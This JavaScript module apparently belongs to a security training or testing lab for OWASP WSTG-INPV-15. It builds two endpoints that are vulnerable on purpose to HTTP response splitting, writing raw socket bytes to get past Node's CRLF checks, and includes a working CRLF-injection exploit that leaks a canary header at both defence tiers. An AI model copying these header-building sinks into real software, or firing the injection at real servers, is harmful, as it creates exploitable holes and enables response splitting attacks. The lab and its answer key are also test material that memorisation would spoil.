// WSTG-INPV-15 (4.7.15) — HTTP Response Splitting via CRLF injection.
//
// Two endpoints both build response headers from query parameters and emit
// them via a raw-socket write (bypassing Node's built-in CRLF hardening,
// which would otherwise reject the injection). Every response also carries
// an X-Internal-Token header whose value is the per-deploy canary. The
// canary header sits AFTER the user-influenced header in the emitted byte
// stream, so a CRLF injection that prematurely terminates the legitimate
// header block surfaces the internal-token header as response body bytes
// the HTTP client reads back.
//
// T0 — neither parameter is filtered. Either endpoint splits cleanly with
//      \r\n\r\n in the user input.
//
// T1 — the redirect handler filters \r and \n out of the destination
//      parameter before concatenating into Location, so the canonical
//      payload (split via redirectParam) fails. The preferences handler
//      still concatenates name and value raw into Set-Cookie. Splitting
//      through prefNameParam (or prefValueParam) bypasses the T0-style
//      filter and yields the canary the same way.

import { Scenario } from './scenario.mjs'

function stripCrlf(s) {
  return String(s == null ? '' : s).replace(/[\r\n]/g, '')
}

// Build the raw HTTP response bytes for a 302 redirect. The destination
// string is concatenated INTO the Location header. The trailing
// X-Internal-Token header carrying the canary is what a splitting
// injection surfaces as body bytes.
function buildRedirectBytes(destination, canary, internalTokenHeader) {
  const body = ''
  return (
    'HTTP/1.1 302 Found\r\n'
    + 'Location: ' + destination + '\r\n'
    + internalTokenHeader + ': ' + canary + '\r\n'
    + 'Content-Type: text/html; charset=utf-8\r\n'
    + 'Content-Length: ' + Buffer.byteLength(body) + '\r\n'
    + 'Connection: close\r\n'
    + '\r\n'
    + body
  )
}

// Build the raw HTTP response bytes for the preference confirmation. The
// preference name and value are concatenated INTO the Set-Cookie header.
function buildPrefBytes(name, value, canary, internalTokenHeader, pageHtml) {
  return (
    'HTTP/1.1 200 OK\r\n'
    + 'Set-Cookie: ' + name + '=' + value + '; Path=/\r\n'
    + internalTokenHeader + ': ' + canary + '\r\n'
    + 'Content-Type: text/html; charset=utf-8\r\n'
    + 'Content-Length: ' + Buffer.byteLength(pageHtml) + '\r\n'
    + 'Connection: close\r\n'
    + '\r\n'
    + pageHtml
  )
}

// What the runtime's send() wrapper sees as the response body. The runtime
// only uses it for canary-includes-based solve attribution and would write
// it to the socket via res.end() — except we have already detached the
// socket, so res.end() is a no-op. Passing the canary string here keeps
// the solve detector accurate for split responses.
function solveDetectorBody(canary, splitOccurred) {
  return splitOccurred ? canary : ''
}

export const classDef = {
  wstgId: 'WSTG-INPV-15',
  class: 'HTTP Splitting (Response Splitting via CRLF)',
  defenceTiers: [0, 1],
  Scenario,
  needsSignup: false,
  canaryRuntime: true,
  discoveryMode: 'observation',
  discoveryTargetPath: (s) => s.redirectPath,
  discoveryStaticOk: (s) =>
    typeof s.chromeInjection?.html === 'string' && s.chromeInjection.html.includes(s.redirectPath),

  matchesRequest({ reqUrl, req, scenario }) {
    if (req.method !== 'GET') return false
    return reqUrl.pathname === scenario.redirectPath
        || reqUrl.pathname === scenario.prefPath
  },

  async handleRequest({ req, reqUrl, scenario, renderPage, manifest }) {
    const tier = manifest.defenceTier || 0
    const canary = manifest.perDeployCanary
    const internalHeader = scenario.internalTokenHeader

    // Redirect endpoint.
    if (reqUrl.pathname === scenario.redirectPath) {
      const destRaw = reqUrl.searchParams.get(scenario.redirectParam)
      if (destRaw == null || destRaw === '') {
        return {
          status: 200,
          body: renderPage(scenario.redirectPageBody),
          headers: { 'Content-Type': 'text/html; charset=utf-8' },
        }
      }
      // T1: filter CR/LF out of the destination before concatenating.
      const destination = tier >= 1 ? stripCrlf(destRaw) : destRaw
      const bytes = buildRedirectBytes(destination, canary, internalHeader)

      const splitOccurred = /\r\n\r\n/.test(destination)
      writeRawAndDetach(req, bytes)
      return {
        status: 302,
        headers: { 'Content-Type': 'text/html; charset=utf-8' },
        body: solveDetectorBody(canary, splitOccurred),
        __rawWritten: true,
      }
    }

    // Preferences endpoint.
    if (reqUrl.pathname === scenario.prefPath) {
      const nameRaw = reqUrl.searchParams.get(scenario.prefNameParam)
      const valueRaw = reqUrl.searchParams.get(scenario.prefValueParam)
      if (nameRaw == null || valueRaw == null) {
        return {
          status: 200,
          body: renderPage(scenario.prefPageBody),
          headers: { 'Content-Type': 'text/html; charset=utf-8' },
        }
      }
      // Both tiers concatenate name and value raw. This is the T1 bypass
      // sink — the redirect filter does not extend to this surface.
      const name = nameRaw
      const value = valueRaw
      const pageHtml = renderPage(scenario.prefPageBody)
      const bytes = buildPrefBytes(name, value, canary, internalHeader, pageHtml)

      const splitOccurred = /\r\n\r\n/.test(name) || /\r\n\r\n/.test(value)
      writeRawAndDetach(req, bytes)
      return {
        status: 200,
        headers: { 'Content-Type': 'text/html; charset=utf-8' },
        body: solveDetectorBody(canary, splitOccurred),
        __rawWritten: true,
      }
    }

    return { status: 404, body: renderPage('<p>Not found.</p>') }
  },

  // Canonical exploit — at T0 splits via redirectParam; at T1 splits via
  // prefNameParam. Both paths recover the X-Internal-Token header bytes
  // by reading the response body the split produces.
  async fireExploit({ baseUrl, scenario, payload }) {
    if (payload === 't1-pref-split') {
      const inj = '\r\n\r\n'  // bare CRLF pair — http client encodes for us
      const name = 'theme' + inj
      const url = new URL(scenario.prefPath, baseUrl)
      url.searchParams.set(scenario.prefNameParam, name)
      url.searchParams.set(scenario.prefValueParam, 'dark')
      const r = await rawFetch(url.toString())
      return r
    }
    // Default: T0 split via redirectParam.
    const inj = '\r\n\r\n'
    const dest = '/' + inj
    const url = new URL(scenario.redirectPath, baseUrl)
    url.searchParams.set(scenario.redirectParam, dest)
    return await rawFetch(url.toString())
  },

  exploitSuccessCriterion: ({ responseBody, perDeployCanary }) =>
    typeof responseBody === 'string' && responseBody.includes(perDeployCanary),
}

// ────────────────────────────────────────────────────────────────────────
// Raw-socket write helper.
//
// Node's http module rejects CR/LF in header values (ERR_INVALID_CHAR) so
// the only path to a real split response is to write the raw bytes to the
// TCP socket and close it. The runtime's subsequent send() call lands on
// an already-closed socket and silently no-ops (the http module's writer
// catches the closed-socket state). The byte stream the client receives
// is purely the split response we wrote here.
// ────────────────────────────────────────────────────────────────────────
function writeRawAndDetach(req, rawBytes) {
  const socket = req.socket
  if (!socket || socket.destroyed) return
  try { socket.write(rawBytes) } catch { /* socket gone */ }
  try { socket.end() } catch { /* already ended */ }
}

// Raw-fetch — a TCP client that does NOT collapse / re-parse the response,
// so the bytes emitted after the response split show up in the captured
// body. fetch/undici parses headers strictly and would discard the
// smuggled second-response bytes from view, so we use a net socket here.
async function rawFetch(urlString) {
  const u = new URL(urlString)
  const isHttps = u.protocol === 'https:'
  const host = u.hostname
  const port = parseInt(u.port || (isHttps ? '443' : '80'), 10)
  const pathQ = u.pathname + (u.search || '')
  const reqLine = (
    `GET ${pathQ} HTTP/1.1\r\n`
    + `Host: ${host}${u.port ? ':' + u.port : ''}\r\n`
    + `Connection: close\r\n`
    + `\r\n`
  )
  // Plain TCP for http; TLS for https (Fly requires TLS on *.fly.dev).
  const transport = isHttps
    ? await import('node:tls')
    : await import('node:net')
  return await new Promise((resolve) => {
    const onConnect = () => sock.write(reqLine)
    const sock = isHttps
      ? transport.connect({ host, port, servername: host }, onConnect)
      : transport.connect(port, host, onConnect)
    let buf = Buffer.alloc(0)
    sock.on('data', (d) => { buf = Buffer.concat([buf, d]) })
    sock.on('end', () => {
      const text = buf.toString('utf-8')
      const firstLine = text.split('\r\n', 1)[0] || ''
      const m = firstLine.match(/^HTTP\/\d\.\d (\d{3})/)
      // Return only the body portion (after the first \r\n\r\n header-body
      // separator). The X-Internal-Token canary header should only surface
      // here when a successful split moved subsequent header lines past
      // the header-body boundary; at T1 with the CRLF filter, the header
      // stays inside the headers block and never reaches body.
      const sepIdx = text.indexOf('\r\n\r\n')
      const body = sepIdx >= 0 ? text.slice(sepIdx + 4) : text
      resolve({ status: m ? parseInt(m[1], 10) : 0, body })
    })
    sock.on('error', () => resolve({ status: 0, body: '' }))
  })
}

export const __test = {
  buildRedirectBytes,
  buildPrefBytes,
  stripCrlf,
  rawFetch,
}
